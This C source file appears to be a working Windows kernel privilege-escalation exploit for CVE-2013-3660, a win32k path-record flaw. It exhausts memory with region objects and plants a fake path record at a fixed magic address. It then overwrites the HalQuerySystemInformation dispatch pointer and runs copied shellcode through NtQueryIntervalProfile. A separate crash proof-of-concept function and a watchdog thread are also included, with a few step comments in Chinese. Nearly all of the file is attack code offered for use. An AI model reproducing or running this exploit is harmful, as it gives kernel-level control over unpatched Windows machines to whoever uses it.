#include "CVE-2013-3660.h"

POINT Points[MAX_POLYPOINTS + 5];
BYTE PointTypes[MAX_POLYPOINTS + 5];
HRGN Regions[MAX_REGIONS + 5];
ULONG NumRegion = 0;
HANDLE Mutex = NULL;
DWORD dwMagic = 0x642464FF;	// jmp [esp + 0x64]

PPATHRECORD PathRecord = NULL;
PATHRECORD ExploitRecord = { 0 };
PPATHRECORD ExploitRecordExit = NULL;
lpfnNtQueryIntervalProfile pNtQueryIntervalProfile = NULL;
PVOID pShellCodeBuffer = NULL;
DWORD dwShellCodeSize = (DWORD)ShellCodeEnd - (DWORD)ShellCode;
DWORD dwStore = 0;

BOOL Exploit_CVE_2013_3360()
{
	BOOL bRet = TRUE;

	if (!Init_CVE_2013_3360())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!Trigger_CVE_2013_3360())
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL Init_CVE_2013_3360()
{
	BOOL bRet = TRUE;

	HMODULE hNtdll = NULL;

	hNtdll = GetModuleHandle("ntdll");
	if (!hNtdll)
	{
		bRet = FALSE;
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	pNtQueryIntervalProfile = (lpfnNtQueryIntervalProfile)GetProcAddress(hNtdll, "NtQueryIntervalProfile");
	if (!pNtQueryIntervalProfile)
	{
		bRet = FALSE;
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}
	
	if (!VirtualAlloc((PVOID)(dwMagic & 0xFFFFF000),
					  PAGE_SIZE,
					  MEM_COMMIT | MEM_RESERVE,
					  PAGE_EXECUTE_READWRITE))
	{
		bRet = FALSE;
		ShowError("VirtualAlloc", GetLastError());
		goto exit;
	}

	PathRecord = (PPATHRECORD)VirtualAlloc(NULL,
										   sizeof(PATHRECORD),
										   MEM_COMMIT | MEM_RESERVE,
										   PAGE_EXECUTE_READWRITE);

	if (!PathRecord)
	{
		bRet = FALSE;
		ShowError("VirtualAlloc", GetLastError());
		goto exit;
	}

	FillMemory(PathRecord, sizeof(PATHRECORD), 0xCC);

	PathRecord->next = PathRecord;
	PathRecord->prev = (PPATHRECORD)(0x42424242);
	PathRecord->flags = 0;

	ExploitRecordExit = (PPATHRECORD)dwMagic;
	ExploitRecordExit->next = NULL;
	ExploitRecordExit->flags = PD_BEGINSUBPATH;
	ExploitRecordExit->count = 0;

	PVOID pHalQuerySystemInformation = GetHalQuerySystemInformation();

	ExploitRecord.next = ExploitRecordExit;
	ExploitRecord.prev = (PPATHRECORD)pHalQuerySystemInformation;
	ExploitRecord.flags = PD_BEZIERS | PD_BEGINSUBPATH;
	ExploitRecord.count = 4;

	ULONG PointNum = 0;
	ULONG PointValue = (ULONG)PathRecord >> 4;

	for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++)
	{
		Points[PointNum].x = PointValue;
		Points[PointNum].y = PointValue;
		PointTypes[PointNum] = PT_BEZIERTO;
	}

	pShellCodeBuffer = VirtualAlloc(NULL, 
									dwShellCodeSize,
									MEM_RESERVE | MEM_COMMIT,
									PAGE_EXECUTE_READWRITE);
	if (!pShellCodeBuffer)
	{
		bRet = FALSE;
		ShowError("VirtualAlloc", GetLastError());
		goto exit;
	}

	ZeroMemory(pShellCodeBuffer, dwShellCodeSize);
	memcpy(pShellCodeBuffer, ShellCode, dwShellCodeSize);
	dwStore = *(PDWORD)pShellCodeBuffer;

exit:
	return bRet;
}

BOOL Trigger_CVE_2013_3360()
{
	BOOL bRet = TRUE;

	HDESK hDesk = NULL;

	hDesk = CreateDesktop("DontPanic", NULL, NULL, 0, GENERIC_ALL, NULL);
	if (hDesk) SetThreadDesktop(hDesk);

	HANDLE hThread = NULL;
	HDC Device = NULL;
	ULONG Size = 0, PointNum = 0;

	while (TRUE)
	{
		Mutex = CreateMutex(NULL, TRUE, NULL);
		if (!Mutex)
		{
			bRet = FALSE;
			ShowError("CreateMutex", GetLastError());
			goto exit;
		}

		Device = GetDC(NULL);
		if (!Device)
		{
			bRet = FALSE;
			ShowError("GetDC", GetLastError());
			goto exit;
		}

		hThread = CreateThread(NULL, 0, WathdogThread, NULL, 0, NULL);
		if (!hThread)
		{
			bRet = FALSE;
			ShowError("CreateMutex", GetLastError());
			goto exit;
		}

		for (Size = 1 << 26; Size; Size >>= 1)
		{
			while (TRUE)
			{
				HRGN hm = CreateRoundRectRgn(0, 0, 1, Size, 1, 1);
				if (!hm) break;

				if (NumRegion < MAX_REGIONS)
				{
					Regions[NumRegion] = hm;
					NumRegion++;
				}
				else NumRegion = 0;
			}
		}

		for (PointNum = MAX_POLYPOINTS; PointNum; PointNum -= 3)
		{
			BeginPath(Device);
			PolyDraw(Device, Points, PointTypes, PointNum);
			EndPath(Device);
			FlattenPath(Device);
			FlattenPath(Device);

			pNtQueryIntervalProfile(2, (PULONG)pShellCodeBuffer);
			*(PDWORD)pShellCodeBuffer = dwStore;

			EndPath(Device);

			if (PathRecord->next == &ExploitRecord) goto exit;
		}

		// 运行到此处，说明漏洞触发失败了，释放掉资源
		ReleaseMutex(Mutex);
		ReleaseDC(NULL, Device);
		WaitForSingleObject(hThread, INFINITE);
	}

exit:
	return bRet;
}

DWORD WINAPI WathdogThread(LPVOID param)
{
	if (WaitForSingleObject(Mutex, CYCLE_TIMEOUT) == WAIT_TIMEOUT)
	{
		while (NumRegion--) DeleteObject(Regions[NumRegion]);
		InterlockedExchangePointer(&PathRecord->next, &ExploitRecord);
	}

	return 0;
}

BOOL POC_CVE_2013_3360()
{
	BOOL bRet = TRUE;

	PathRecord = (PPATHRECORD)VirtualAlloc(NULL,
										   sizeof(PATHRECORD),
										   MEM_COMMIT | MEM_RESERVE,
										   PAGE_EXECUTE_READWRITE);
	if (!PathRecord)
	{
		bRet = FALSE;
		ShowError("VirtualAlloc", GetLastError());
		goto exit;
	}

	FillMemory(PathRecord, sizeof(PATHRECORD), 0xCC);

	PathRecord->next = PathRecord;
	PathRecord->prev = (PPATHRECORD)0x42424242;
	PathRecord->flags = 0;

	ExploitRecord.next = NULL;
	ExploitRecord.prev = (PPATHRECORD)0x1;
	ExploitRecord.flags = PD_BEZIERS;

	ULONG PointNum = 0;
	ULONG PointValue = (ULONG)(PathRecord) >> 4;

	for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++)
	{
		Points[PointNum].x = PointValue;
		Points[PointNum].y = PointValue;
		PointTypes[PointNum] = PT_BEZIERTO;
	}

	SetThreadDesktop(CreateDesktop("DontPanic", NULL, NULL, 0, GENERIC_ALL, NULL));

	while (TRUE)
	{
		Mutex = CreateMutex(NULL, TRUE, NULL);
		if (!Mutex)
		{
			bRet = FALSE;
			ShowError("CreateMutex", GetLastError());
			goto exit;
		}

		HANDLE hThread = NULL;

		hThread = CreateThread(NULL, 0, WathdogThread, NULL, 0, NULL);
		if (!hThread)
		{
			bRet = FALSE;
			ShowError("CreateThread", GetLastError());
			goto exit;
		}

		// 消耗内存，让newpathrec函数返回失败
		ULONG Size = 0;
		for (Size = 1 << 26; Size; Size >>= 1) {
			while (TRUE) {
				HRGN hm = CreateRoundRectRgn(0, 0, 1, Size, 1, 1);
				if (!hm) {
					break;
				}
				if (NumRegion < MAX_REGIONS)
				{
					Regions[NumRegion] = hm;
					NumRegion++;
				}
				else NumRegion = 0;
			}
		}

		HDC Device = NULL;

		Device = GetDC(NULL);

		for (PointNum = MAX_POLYPOINTS; PointNum; PointNum -= 3)
		{
			// 频繁释放，申请内存
			BeginPath(Device);
			PolyDraw(Device, Points, PointTypes, PointNum);
			EndPath(Device);
			// 触发漏洞
			FlattenPath(Device);
			FlattenPath(Device);
			EndPath(Device);
		}

		ReleaseMutex(Mutex);
		ReleaseDC(NULL, Device);
		WaitForSingleObject(hThread, INFINITE);
	}

exit:
	return bRet;
}
